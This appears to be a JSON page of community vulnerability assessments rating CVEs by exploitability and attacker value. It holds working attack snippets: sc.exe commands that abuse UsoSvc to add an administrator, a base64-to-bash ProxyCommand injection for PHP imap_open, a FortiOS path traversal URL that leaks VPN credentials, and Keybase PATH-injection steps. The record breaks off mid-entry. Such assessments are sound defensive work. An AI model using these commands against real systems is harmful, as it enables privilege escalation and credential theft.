{
  "links": {
    "next": {
      "href": "/v1/assessments?expand=tags&page=5&size=100&sort=created%3Aasc"
    },
    "prev": {
      "href": "/v1/assessments?expand=tags&page=3&size=100&sort=created%3Aasc"
    },
    "self": {
      "href": "/v1/assessments?expand=tags&page=4&size=100&sort=created%3Aasc"
    }
  },
  "data": [
    {
      "id": "072e3666-47ad-45ab-8366-518ed1fa1885",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "4fe1f032-b17d-4dd5-9f39-f382c5042621",
      "created": "2020-03-25T00:36:17.204774Z",
      "revisionDate": "2020-03-25T00:36:17.208243Z",
      "document": "Debut makes an embedded http server which is likely on 'dumb' devices which need a web server for configuration such as Brother and HP printers.  Exploitation is trivial, just send 40 characters of data in a POST request w/o authentication, and the service will crash.  Since these devices are typically cheap and 'dumb', crashing the http server will most likely also cause the entire device to reboot, or require a watchdog service to restart the http server.  Isn't much to gain here though since you're simply crashing a service.  DoS printers, save trees?\r\nHowever, of note, these devices may not include a firmware update mechanism, and may therefore be vulnerable for life, such as my Brother HL-L2380DW.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "pre_auth",
          "difficult_to_patch",
          "no_useful_data"
        ],
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "868a93a5-db8b-46fc-b269-373333a9ff02",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "e10c33f9-1459-49b8-8554-7dd499a8313a",
      "created": "2020-03-25T00:46:56.688595Z",
      "revisionDate": "2020-03-25T00:46:56.691514Z",
      "document": "This is similar to CVE-2009-2936, but on a local binary instead of a network port.  The binary, which is obscure and not easy to find, when given an arbitrary file as input with debug and verbose mode set, will attempt to load it.  The arbitrary file will fail to load because it isn't a correct file, and the first line will be echoed back to the screen, split at 20 characters in length.  The binary also runs with the `suid` bit set, so most likely you'll want `/etc/shadow` to get root's hash.",
      "score": 1,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "obscure_configuration"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "b550e76b-5c86-412e-a2a9-937b075f5b96",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "35cb145f-3b4b-4c42-b848-f9cc0cf6a503",
      "created": "2020-03-25T00:59:58.868978Z",
      "revisionDate": "2020-03-25T00:59:58.872884Z",
      "document": "The `imap_open` function within php, if called without the `/norsh` flag, will attempt to preauthenticate an IMAP session.  On Debian based systems, including Ubuntu, rsh is mapped to the ssh binary.  Ssh's `ProxyCommand` option can be passed from imap_open to execute arbitrary commands.\r\nThe execution flow of this, on Debian systems is as such:\r\n\r\n1. PHP `imap_open` via `rsh`\r\n2. `rsh` aliased to `ssh`\r\n3. SSH's `ProxyCommand` RCE\r\n\r\nThere were some other nuances, such as not allowing spaces (`$IFS$()` is OK).  Typical execution of this at the SSH side was to base64 encode the payload and pipe it to bash: ```\"-oProxyCommand=`echo #{enc_payload}|base64 -d|bash`\"```.\r\n\r\nThe trick is finding where a webapp calls the `imap_open` functionality.  Typically this is in a higher privileged part of the webapp, since it could be destructive (such as disabling notifications).  Some webapps seem to include the function call, but never call the function which uses it (maybe there for plugins to use?).",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": []
    },
    {
      "id": "51078bd7-c269-4e13-8866-65760cad8f6b",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "76dc2821-aa7b-4089-bfdf-5440029be6a3",
      "created": "2020-03-25T01:07:38.946469Z",
      "revisionDate": "2020-03-25T01:07:38.949932Z",
      "document": "The big kicker for this was that it didn't work on the cellular side, so you needed to be on the same network as the device.  The device most likely being on the wifi, so a coffee bar or airport would have been prime exploitation grounds.\r\nES File Explorer is a VERY common software, often included on cheaper Android phones, for browsing files.  The vulnerability basically gave as much access to the device as you'd want, allowing for almost everything but RCE.  The software on the odd port spoke HTTP, so JSON POST commands were the common language.",
      "score": 1,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "pre_auth",
          "default_configuration"
        ]
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "72292083-6942-4e62-95b4-24cb77f5148b",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "90c7f945-c550-401e-bf90-08fd13cd5c9b",
      "created": "2020-03-25T01:13:52.941439Z",
      "revisionDate": "2020-03-25T01:13:52.944723Z",
      "document": "Exploitation of this vulnerability is temperamental at least, destructive at most.  While triggering the exploit, it seems somewhat dependent on a higher than default `kern.maxfiles`.  If maxfiles is set too low, the box will reboot.\r\nIf exploitation is successful, in order to cause the RCE, `/etc/libmap.conf`is altered.  If the original one is not restored, the box is bricked since it attempts to call the payload which was most likely deleted once run.\r\nExploitation can take between 20-70 minutes.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "obscure_configuration"
        ],
        "attacker-value": 5,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "710d25ef-ca87-4181-a089-758e786d45f0",
      "editorId": "32fa7c1c-667b-4d0d-b997-36dda53122cd",
      "topicId": "65e2cbb8-74e4-4094-8b16-0323664fb819",
      "created": "2020-03-25T10:52:16.1049Z",
      "revisionDate": "2020-03-25T10:52:16.10847Z",
      "document": "# Description\r\nThis is a Replay Attack found in versions 2.0.0 to 2.4.0 of \"Sustainsys.Saml2\" Nuget package.\r\nThe attacker can wait for the user's token to be sent and reuse it.\r\n\r\n\"The Sustainsys.Saml2 library adds SAML2P support to ASP.NET web sites, allowing the web site to act as a SAML2 Service Provider (SP). The library was previously named Kentor.AuthServices.\"\r\n\r\n# Severity\r\nIt depends on the context that the library is being used in. It can grant authentification as another user.\r\nThough getting the token requires high access to the user.",
      "score": 1,
      "metadata": {
        "tags": [
          "requires_interaction",
          "no_useful_data",
          "pre_auth",
          "default_configuration",
          "difficult_to_exploit"
        ],
        "attacker-value": 1,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "8c353550-92cb-454f-ba8a-c774da949acd",
      "editorId": "32fa7c1c-667b-4d0d-b997-36dda53122cd",
      "topicId": "b4adbd63-8f24-4167-8ba8-f9df77874c6b",
      "created": "2020-03-25T11:25:07.874131Z",
      "revisionDate": "2020-07-20T20:11:30.701363Z",
      "document": "# Description \r\nThis is more of a bad configuration and practice from the user that allows an attacker to infect the command-line Safety package's detection routines by disguising, or obfuscating, other malicious or non-secure packages.\r\n\r\n# Vulnerable configurations\r\n* You are running Safety in a Python environment that you don\u2019t trust.\r\n* You are running Safety from the same Python environment where you have your dependencies installed.\r\n* Dependency packages are being installed arbitrarily or without proper verification.\r\n*This can easily be fixed.*\r\n\r\n# Exploitation\r\nA malicious package can avoid detection by Safety on load by running code in __init__.py such as seen in *https://github.com/akoumjian/python-safety-vuln/blob/master/malicious/__init__.py* which contains a patch.\r\nThis results in the package not to be flagged as malicious.\r\n\r\n# PoC\r\nA great PoC and explanation is available at https://github.com/akoumjian/python-safety-vuln",
      "score": 2,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "post_auth"
        ],
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "1bba28f9-4530-4827-8533-ac3615c5b456",
      "editorId": "32fa7c1c-667b-4d0d-b997-36dda53122cd",
      "topicId": "85c440ba-bfed-4b51-aafa-1dd23ed63fe8",
      "created": "2020-03-25T14:35:46.629625Z",
      "revisionDate": "2020-03-25T14:35:46.632592Z",
      "document": "# Description\r\nArbitrary code can be executed on the rooter due to bad login requests handling (when the password is empty.)\r\nThat can allow the attacker to get inside the network and eventually retrieve information using the router itself.\r\n\r\n# Versions\r\n Routers: DIR-867, DIR-878, and DIR-882 \r\nFirmware: 1.10B04 ",
      "score": 1,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "pre_auth",
          "difficult_to_exploit"
        ],
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "47f78818-b766-47ca-8262-d7abc8dced66",
      "editorId": "476d5018-c9fe-422d-825b-d5601af6bcf0",
      "topicId": "8011789d-8681-4c89-a088-8e14d395987f",
      "created": "2020-03-25T15:59:33.70864Z",
      "revisionDate": "2020-03-27T04:08:13.414208Z",
      "document": "This is an elevation of privilege vulnerability that exists when Windows improperly handles authentication requests by leveraging the Update Orchestrator Service. If an attacker successfully exploits this vulnerability they can run processes in an elevated context. \r\n\r\n\r\n**Prerequisite**:  \r\n\r\nThe Update Orchestrator Service runs as NT AUTHORITY\\SYSTEM and any user in the group NT AUTHORITY\\SERVICE have full access to modify the service.\r\n\r\nIt is known to affect Windows 10 1803 and above that have not been updated with the November 12th, 2019 security update patch (or above).\r\n \r\n\r\n**Exploitation**: \r\n\r\nCreate tmpUser, add to local administrators group, and reset the service to its default state.\r\n\r\n```sh\r\nsc.exe stop UsoSvc\r\nsc.exe config UsoSvc binPath=\"cmd /c net user /add tmpUser tmpPassword123\"\r\nsc.exe start UsoSvc\r\nsc.exe stop UsoSvc\r\nsc.exe config UsoSvc binPath=\"cmd /c net localgroup Administrators /add tmpUser\"\r\nsc.exe start UsoSvc\r\nsc.exe stop UsoSvc\r\nsc.exe config UsoSvc binPath=\"C:\\Windows\\System32\\svchost.exe -k netsvcs -p\"\r\nsc.exe start UsoSvc\r\n```",
      "score": 2,
      "metadata": {
        "tags": [
          "high_privilege_access"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "6db90257-86b5-4748-ae01-82cea24fcfdb",
      "editorId": "10bfc743-3786-435c-88e8-56e791bbc053",
      "topicId": "35b88369-c440-49c0-98ff-c50e258fb32c",
      "created": "2020-03-25T20:04:57.831425Z",
      "revisionDate": "2020-12-02T01:23:14.477896Z",
      "document": "\r\n**Description**\r\n\r\nDue to a pre-authenticated Path Trasversal vulnerability under the SSL VPN portal on FortiOS, an attacker is able to pull arbitrary system files from the file system. One of the most critical files which an attacker may pull is \"sslvpn_websessions\" which contains session information including usernames and password.\r\n\r\nOnce the attacker has obtained the credentials from this file, he can authenticated with those credentials, compromising the corporate perimeter.\r\n\r\n**Mitigation**\r\n\r\n- Upgrade to FortiOS 5.4.13, 5.6.8, 6.0.5 or 6.2.0 and above.\r\n- Enable 2FA. Note the attacker will not be able to log in to the VPN, but the obtained credentials are still valid (potencial domain creds) to access corporate mail, etc.\r\n\r\n**Affected Systems**\r\n\r\n- FortiOS 6.0: 6.0.0 to 6.0.4\r\n- FortiOS 5.6: 5.6.3 to 5.6.7\r\n- FortiOS 5.4: 5.4.6 to 5.4.12\r\n\r\nNOTE: Only if the SSL VPN service (web-mode or tunnel-mode) is enabled.\r\n\r\n**PoC**\r\n\r\nThere are some public working exploits for this vulnerability, targeting the \"sslvpn_websessions\" system file.\r\n\r\nAn attacker would access the following URL:\r\n- https://<IP_ADDRESS>/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession\r\n\r\nAnd after some parsing to the binary file, something like the following output would be obtained:\r\n\r\n![LOGO] (https://devco.re/assets/img/blog/20190807/4.png)\r\n\r\nNOTE: Example image obtained from https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/\r\n\r\n",
      "score": 11,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "1bd71b6c-b4df-41a5-bc28-bc62517b7d0a",
      "editorId": "10bfc743-3786-435c-88e8-56e791bbc053",
      "topicId": "fbbd7a87-937d-413f-90f6-2500b6c2f582",
      "created": "2020-03-26T18:56:42.624376Z",
      "revisionDate": "2020-03-26T18:57:09.251845Z",
      "document": "**Description**\r\n\r\nThe installation of a vulnerable version of Keybase deploys a SUID binary named \u201ckeybase-redirector\u201d which calls the \"fusermount\" binary using a relative path, making the application trust the value of $PATH. This triggers a PATH injection vulnerability which allows local privilege escalation by using a malicious file with its name set to \"fusermount\".\r\n\r\n**Mitigation**\r\n\r\nThe maintainer has released some fixes, so the software must be upgrade to Keybase version 2.8.0-20181023124437 or above.\r\n\r\n**Affected Systems**\r\n\r\nAll Keybase versions prior to 2.8.0-20181023124437.\r\n\r\n**PoC**\r\n\r\n1- We can identify a potential vulnerable installation with the following command, which will help us identify the SUID binary related to Keybase.\r\n\r\n```\r\nfind / -perm 4000 2>/dev/null | grep keybase\r\n```\r\n2- To verify the vulnerability, we check the output of the following command is prior to 2.8.0-20181023124437.\r\n```\r\nkeybase -v\r\n```\r\n\r\n3- In case the the software version is vulnerable, we may create a malicious binary (which executes, for example, a rshell, creates a high privilege user, etc.) with the name fusermount and deploy it on a directory to be injected on the PATH.\r\n```\r\nNOTE: Development and compilation of the binary left for the tester\r\n```\r\n\r\n4- We add the directory in the first position inside the path variable and execute the Keybase software.\r\n```\r\nenv PATH=<malicious_dir_path>:$PATH /usr/bin/keybase-redirector /keybase\r\n```\r\n\r\nThis will execute the payload inside the malicious binary as root.\r\n\r\n**Personal Notes**\r\nIn some engagements, I have seen this software installed on workstation or servers from DevOps/SecDevOps teams, where they manage access keys and credentials for critical corporate infrastructure. Because of this, a Keybase vulnerable installation should not be taken lightly.",
      "score": 1,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "easy_to_develop",
          "post_auth"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "bd1a7feb-c994-43d7-a1c1-b7b6b8940623",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "e8d149b5-e75a-463b-b4cb-2e01e917823f",
      "created": "2020-03-27T16:08:42.957459Z",
      "revisionDate": "2020-03-27T16:08:42.960143Z",
      "document": "The `uid` field is passed within a `GET` parameter.  These are sequential integers, so it is trivial to enumerate them all.  The session for the UID needs to be valid, and the timeout is rather long.  So it's rather trivial to simply enumerate through them in an infinite loop to get an admin.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "difficult_to_patch",
          "easy_to_develop"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "393d7e3e-f004-4b0e-bbc9-48e8a43c351a",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "8e6c800c-0c6a-4b6c-b8eb-de019475c34e",
      "created": "2020-03-27T16:11:13.298212Z",
      "revisionDate": "2020-03-27T21:40:50.748296Z",
      "document": "` /home/dna/spool/.pfile` is the database file for users.  It is a tab delimited file, and by default passwords are kept in cleartext.  An option is available to hash the passwords (MD5 I believe), however it is not the default.  The configuration we found in live tested included several admin accounts for the software developer.  No patch was available or would be created when the developer was notified.",
      "score": 2,
      "metadata": {
        "tags": [
          "difficult_to_patch",
          "easy_to_develop",
          "pre_auth",
          "high_privilege_access",
          "default_configuration"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b9f4eb2b-0afe-4948-8703-4bf943931a6d",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "2705bcea-341d-44b4-b544-633b48452fee",
      "created": "2020-03-27T16:16:37.608372Z",
      "revisionDate": "2020-03-27T21:40:45.131394Z",
      "document": "The Admin console includes a command to run shell commands.  The `GET`request to `cgi-bin/dna/sysAdmin.cgi` requires administrative privileges on the account, however the `POST` command to run a command does not require authentication.  Thus allowing an arbitrary command execution.  Scripts were all written in perl, so a perl based payload is most safe.",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "difficult_to_patch",
          "easy_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "4310cbaa-5e90-49c9-8573-bb91efed86a7",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "dc6838dd-aeeb-4ca4-8f05-ed44758b80fc",
      "created": "2020-03-27T16:37:38.151544Z",
      "revisionDate": "2020-03-27T21:40:38.73475Z",
      "document": "Typically you'll want to combine this vulnerability with CVE-2017-6528 to download the user/password database.  Developer was not interested in patching this vulnerability.  This is just a typical directory traversal, but a null `%00` at the end.  In production we found this to be 4 `../` of depth.",
      "score": 2,
      "metadata": {
        "tags": [
          "difficult_to_patch",
          "default_configuration"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a9be2b4f-415e-469b-b767-33ef3264d546",
      "editorId": "10bfc743-3786-435c-88e8-56e791bbc053",
      "topicId": "131226a6-a1e9-48a1-a5d0-ac94baf8dfd2",
      "created": "2020-03-29T16:46:17.144704Z",
      "revisionDate": "2020-06-10T02:40:28.694268Z",
      "document": "**Description**\r\n\r\nA vulnerability in the RDP windows service allows the execution of malicious code with the injection of code in the request for a RDP connection. The exploitation of this vulnerability may be used for performing a DoS (Denial Of Service) attack or executing code in a remote system.\r\n\r\nFor the safe and satisfactory exploitation of this vulnerability, it is recommended to identify the target machine so the exploit is reliably crafted.\r\n\r\n**Mitigation**\r\n\r\n- Apply the corresponding security patches released by Microsoft (supported and unsupported OSs)\r\n- Disabling RDP service where no needed and controlling its exposure using a FW internally and externally\r\n- Enabling network level authentication in RDP services\r\n\r\n**Affected Systems**\r\n\r\nThe following Operating System are affected if they have not been patched:\r\n\r\n- Windows Vista\r\n- Windows 7\r\n- Windows XP\r\n- Windows Server 2003\r\n- Windows Server 2008\r\n\r\n**References**\r\n\r\n- The exploit is now included in Metasploit. (The exploit may requier some tuning)\r\n- https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708\r\n\r\n**Personal Notes**\r\n\r\nWhen I have released this assessment, the coronavirus crisis has required for a massive number of companies and entities to go \"remote work\", and an important increment in exposed RDP services on the internet has been detected. Need to emphasize ICS environments and the infrastructure supporting heath services.\r\n",
      "score": 3,
      "metadata": {
        "tags": [
          "common_enterprise",
          "high_privilege_access"
        ],
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "da6a5bc6-41d1-4767-a61d-1895592ff2d7",
      "editorId": "609518a5-561e-4f03-b60e-4b8f0f7e91bc",
      "topicId": "3b64b132-1e7a-49bb-a187-96db3b84bd2a",
      "created": "2020-03-30T15:49:10.248698Z",
      "revisionDate": "2023-11-29T10:44:57.354842Z",
      "document": "quick assessment to add references:\r\ngood write up the vulnerability https://www.synacktiv.com/posts/pentest/how-to-exploit-liferay-cve-2020-7961-quick-journey-to-poc.html\r\nworking PoC https://github.com/mzer0one/CVE-2020-7961-POC\r\n\r\nthere is not so much to add here because synacktiv already explained what's interesting: a preauth RCE on a commonly used in enterprise and internet faced framework. a framework NOT updated on regularly basis.\r\n\r\nplus, based on my very own experience, liferay/tomcat on windows let you mostly land as SYSTEM. with an install base, according to shodan, of more than the half on windows, this is a very interesting vuln to exploit",
      "score": 3,
      "metadata": {
        "tags": [
          "pre_auth",
          "common_enterprise",
          "default_configuration",
          "easy_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a7cbe877-beae-412b-a11a-853b40ddc97e",
      "editorId": "2ccacbe6-ae15-400a-8cd0-57acc7fb593c",
      "topicId": "9971afda-9ded-4102-bbe0-9b80369a2544",
      "created": "2020-04-01T13:53:54.711527Z",
      "revisionDate": "2020-04-01T13:53:54.715108Z",
      "document": "With a CVSS base score of 7.4 and 1.7 million code hits from a Github search, this is looking like it has potential. ",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise"
        ],
        "attacker-value": 2,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        }
      ]
    },
    {
      "id": "943eddd0-ad27-4882-be7e-de5b1591bb26",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "6f81bc44-c000-427d-b222-b64c29bda621",
      "created": "2020-04-02T18:38:39.464156Z",
      "revisionDate": "2020-04-02T18:45:15.473516Z",
